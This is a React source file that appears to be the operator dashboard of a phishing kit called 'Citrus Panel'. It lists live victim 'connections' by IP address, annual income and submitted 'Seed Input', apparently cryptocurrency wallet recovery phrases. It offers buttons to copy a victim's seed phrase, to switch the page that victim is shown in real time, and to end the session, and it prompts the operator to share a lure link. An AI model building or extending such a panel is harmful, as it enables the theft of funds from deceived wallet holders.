"use client"

import { useState, useEffect } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Users, Eye, Copy, RefreshCw, X, Info } from "lucide-react"
import { useConnections } from "@/contexts/connection-context"
import { toast } from "sonner"
import TemplateManager from "./template-manager"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import type { Connection } from "@/lib/connection-store"

export default function SupportDashboard() {
  const { connections, totalConnections, totalVisits, endConnection } = useConnections()
  const [selectedConnectionId, setSelectedConnectionId] = useState<string | null>(null)
  const [isTemplateManagerOpen, setIsTemplateManagerOpen] = useState(false)
  const [isDetailsModalOpen, setIsDetailsModalOpen] = useState(false)
  const [viewingConnection, setViewingConnection] = useState<Connection | null>(null)

  // Auto-refresh connections every 5 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      // The useConnections hook already handles real-time updates
      // This is just to ensure we're always in sync
      window.dispatchEvent(new Event("refresh-connections"))
    }, 5000)

    return () => clearInterval(interval)
  }, [])

  const handleCopySeed = (seedInput: string) => {
    navigator.clipboard.writeText(seedInput)
    toast.success("Seed phrase copied to clipboard")
  }

  const handleUpdatePage = (connectionId: string) => {
    setSelectedConnectionId(connectionId)
    setIsTemplateManagerOpen(true)
  }

  const handleEndConnection = (connectionId: string) => {
    endConnection(connectionId)
    toast.success("Connection ended")
  }

  const handleViewDetails = (connection: Connection) => {
    setViewingConnection(connection)
    setIsDetailsModalOpen(true)
  }

  const activeConnections = connections.filter((conn) => conn.status !== "ended")

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="space-y-2">
        <h1 className="text-3xl font-bold text-gray-900 dark:text-white">Citrus Panel</h1>
        <p className="text-gray-600 dark:text-gray-400">"The only way to do great work is to love what you do."</p>
      </div>

      {/* Stats Cards - Only 2 cards as requested */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <Card>
          <CardContent className="p-6">
            <div className="flex items-center space-x-2">
              <Users className="h-5 w-5 text-blue-600" />
              <div>
                <p className="text-sm text-gray-600 dark:text-gray-400">Total Connects</p>
                <p className="text-2xl font-bold">{activeConnections.length}</p>{" "}
                {/* Changed to activeConnections.length */}
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="p-6">
            <div className="flex items-center space-x-2">
              <Eye className="h-5 w-5 text-green-600" />
              <div>
                <p className="text-sm text-gray-600 dark:text-gray-400">Total Visits</p>
                <p className="text-2xl font-bold">{totalVisits}</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Connections Table */}
      <Card>
        <CardContent className="p-6">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-xl font-semibold">Active Connections</h2>
            <div className="flex items-center space-x-2">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
              <span className="text-sm text-gray-500">Auto-refreshing</span>
            </div>
          </div>
          {activeConnections.length === 0 ? (
            <div className="text-center py-8 text-gray-500">
              No active connections. Share the link:{" "}
              <code className="bg-gray-100 dark:bg-gray-800 px-2 py-1 rounded">/thepage</code>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b">
                    <th className="text-left p-4">IP Address</th>
                    <th className="text-left p-4">Page</th>
                    <th className="text-left p-4">Annual Income</th>
                    <th className="text-left p-4">Seed Input</th>
                    <th className="text-left p-4">Actions</th>
                    <th className="text-left p-4">Status</th>
                  </tr>
                </thead>
                <tbody>
                  {activeConnections.map((connection) => (
                    <tr key={connection.id} className="border-b hover:bg-gray-50 dark:hover:bg-gray-800">
                      <td className="p-4 font-mono text-sm">{connection.ip}</td>
                      <td className="p-4">{connection.page}</td>
                      <td className="p-4 font-semibold text-green-600">{connection.annualIncome || "N/A"}</td>
                      <td className="p-4">
                        <div className="max-w-xs truncate font-mono text-xs bg-gray-100 dark:bg-gray-800 p-2 rounded">
                          {connection.seedInput || "Not provided"}
                        </div>
                      </td>
                      <td className="p-4">
                        <div className="flex space-x-2">
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleCopySeed(connection.seedInput)}
                            className="h-8 w-8 p-0"
                            disabled={!connection.seedInput}
                          >
                            <Copy className="h-4 w-4" />
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleUpdatePage(connection.id)}
                            className="h-8 w-8 p-0"
                          >
                            <RefreshCw className="h-4 w-4" />
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleViewDetails(connection)}
                            className="h-8 w-8 p-0"
                          >
                            <Info className="h-4 w-4" />
                          </Button>
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => handleEndConnection(connection.id)}
                            className="h-8 w-8 p-0"
                          >
                            <X className="h-4 w-4" />
                          </Button>
                        </div>
                      </td>
                      <td className="p-4">
                        <Badge
                          variant={
                            connection.status === "active"
                              ? "default"
                              : connection.status === "pending"
                                ? "secondary"
                                : "destructive"
                          }
                        >
                          {connection.status}
                        </Badge>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Template Manager Modal */}
      <TemplateManager
        isOpen={isTemplateManagerOpen}
        onClose={() => setIsTemplateManagerOpen(false)}
        connectionId={selectedConnectionId || ""}
      />

      {/* Connection Details Modal */}
      <Dialog open={isDetailsModalOpen} onOpenChange={setIsDetailsModalOpen}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle>Connection Details</DialogTitle>
            <DialogDescription>Full information for connection ID: {viewingConnection?.id}</DialogDescription>
          </DialogHeader>
          {viewingConnection && (
            <div className="space-y-3 text-sm">
              <div className="flex justify-between">
                <span className="font-medium">IP Address:</span>
                <span className="font-mono">{viewingConnection.ip}</span>
              </div>
              <div className="flex justify-between">
                <span className="font-medium">Page:</span>
                <span>{viewingConnection.page}</span>
              </div>
              <div className="flex justify-between">
                <span className="font-medium">Annual Income:</span>
                <span>{viewingConnection.annualIncome || "N/A"}</span>
              </div>
              <div>
                <span className="font-medium block mb-1">Seed Input:</span>
                <textarea
                  readOnly
                  value={viewingConnection.seedInput || "Not provided"}
                  className="w-full p-2 border rounded-md bg-gray-100 dark:bg-gray-800 font-mono text-xs min-h-[80px] resize-none"
                />
              </div>
              {viewingConnection.additionalInputs &&
                Object.entries(viewingConnection.additionalInputs).map(([key, value]) => (
                  <div key={key}>
                    <span className="font-medium block mb-1">
                      {key.replace(/([A-Z])/g, " $1").replace(/^./, (str) => str.toUpperCase())}:
                    </span>
                    <textarea
                      readOnly
                      value={value || "Not provided"}
                      className="w-full p-2 border rounded-md bg-gray-100 dark:bg-gray-800 font-mono text-xs min-h-[60px] resize-none"
                    />
                  </div>
                ))}
              <div className="flex justify-between">
                <span className="font-medium">Timestamp:</span>
                <span>{new Date(viewingConnection.timestamp).toLocaleString()}</span>
              </div>
              <div className="flex justify-between">
                <span className="font-medium">Status:</span>
                <Badge
                  variant={
                    viewingConnection.status === "active"
                      ? "default"
                      : viewingConnection.status === "pending"
                        ? "secondary"
                        : "destructive"
                  }
                >
                  {viewingConnection.status}
                </Badge>
              </div>
              <div>
                <span className="font-medium block mb-1">User Agent:</span>
                <textarea
                  readOnly
                  value={viewingConnection.userAgent || "N/A"}
                  className="w-full p-2 border rounded-md bg-gray-100 dark:bg-gray-800 font-mono text-xs min-h-[60px] resize-none"
                />
              </div>
            </div>
          )}
          <div className="flex justify-end">
            <Button onClick={() => setIsDetailsModalOpen(false)}>Close</Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
